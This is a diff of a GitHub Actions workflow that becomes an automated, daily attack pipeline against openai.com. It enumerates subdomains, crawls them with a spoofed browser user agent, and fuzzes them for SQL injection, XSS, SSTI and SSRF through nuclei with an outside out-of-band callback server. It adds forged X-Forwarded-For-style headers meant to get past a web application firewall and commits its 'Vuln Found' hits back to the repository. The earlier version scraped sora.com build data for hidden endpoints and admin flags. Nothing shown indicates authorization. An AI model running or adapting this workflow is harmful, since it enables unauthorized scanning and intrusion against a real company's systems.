@@ -1,43 +1,83 @@
-name: OpenAI Recon – Deep bj
+name: "Elite Exploit & Recon Engine 2026"
+
 on:
+  schedule:
+    - cron: '0 0 * * *'
   workflow_dispatch:
 
+permissions:
+  contents: write
+
 jobs:
-  deep-scan:
+  # STEP 1: DEEP RECON (Subdomains & Crawling)
+  recon:
     runs-on: ubuntu-latest
+    outputs:
+      params_file: ${{ steps.crawl.outputs.params }}
     steps:
-      - name: Create Evidence Dir
-        run: mkdir -p evidence/deep_dive
-
-      - name: Enumerate Next.js Build IDs
+      - uses: actions/checkout@v4
+      - name: Install Tools
         run: |
-          # Finding the 'Build ID' allows us to find hidden JSON data for every page
-          BUILD_ID=$(curl -s https://sora.com/ | grep -oE '"buildId":"[^"]+"' | cut -d'"' -f4)
-          echo "Build ID Found: $BUILD_ID"
-          echo $BUILD_ID > evidence/deep_dive/build_id.txt
+          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+          go install -v github.com/projectdiscovery/katana/cmd/katana@latest
+          echo "$HOME/go/bin" >> $GITHUB_PATH
 
-          # Common pages to check for hidden data
-          PAGES=("index" "library" "creations" "settings" "profile" "explore")
-          for page in "${PAGES[@]}"; do
-            URL="https://sora.com/_next/data/${BUILD_ID}/${page}.json"
-            echo "Checking: $URL"
-            curl -s -o "evidence/deep_dive/${page}_data.json" "$URL" || true
-          done
-
-      - name: Extract Hidden IDs & API Endpoints
+      - name: Subdomain & Param Discovery
+        id: crawl
         run: |
-          # Extract anything that looks like a UUID or a secret endpoint from the JSON data
-          grep -oE '[a-f0-9-]{36}' evidence/deep_dive/*.json > evidence/deep_dive/found_uuids.txt || true
-          grep -oE 'https://[^"]+openai\.com/[^"]+' evidence/deep_dive/*.json > evidence/deep_dive/hidden_api_routes.txt || true
+          mkdir -p output/
+          subfinder -d openai.com -silent | httpx -silent -o output/alive.txt
+          # WAF-Safe Crawling with custom headers
+          katana -list output/alive.txt -jc -kf all -d 3 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -o output/params.txt
+          echo "params=output/params.txt" >> $GITHUB_OUTPUT
 
-      - name: Grep for "Internal Only" Logic
-        run: |
-          # Look for flags that indicate features disabled for the public but active in the code
-          grep -iE 'isInternal|isAdmin|experimental|feature_flag|can_edit_others' evidence/deep_dive/*.json >> evidence/deep_dive/logic_flags.txt || true
-
-      - name: Upload Deep Dive
+      - name: Archive Recon
         uses: actions/upload-artifact@v4
         with:
-          name: deep-dive-results
-          path: evidence/deep_dive/
+          name: recon-data
+          path: output/
+
+  # STEP 2: PARALLEL FUZZING (SQLi, XSS, SSTI, SSRF)
+  fuzz:
+    needs: recon
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        vuln_type: [sqli, xss, ssti, ssrf]
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/download-artifact@v4
+        with:
+          name: recon-data
+          path: output/
+      
+      - name: Install Nuclei
+        run: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && echo "$HOME/go/bin" >> $GITHUB_PATH
+
+      - name: Run Targeted Fuzzing
+        env:
+          ISH_TOKEN: ${{ secrets.INTERACTSH_TOKEN }}
+        run: |
+          # Bypassing WAF via Header Manipulation & OAST Fallback
+          # Using oast.fun/oast.me pool if default is down
+          nuclei -l output/params.txt \
+            -tags ${{ matrix.vuln_type }},dast \
+            -interactsh-server oast.fun \
+            -itoken $ISH_TOKEN \
+            -header "X-Forwarded-For: 127.0.0.1" \
+            -header "X-Originating-IP: 127.0.0.1" \
+            -header "X-Remote-IP: 127.0.0.1" \
+            -rate-limit 100 \
+            -o output/${{ matrix.vuln_type }}_hits.txt
+
+      - name: Save Findings
+        run: |
+          git config --local user.email "bot@recon.ai"
+          git config --local user.name "Exploit-Bot"
+          git pull origin main
+          git add output/
+          git commit -m "Vuln Found: ${{ matrix.vuln_type }} $(date)" || echo "No new hits"
+          git push
           
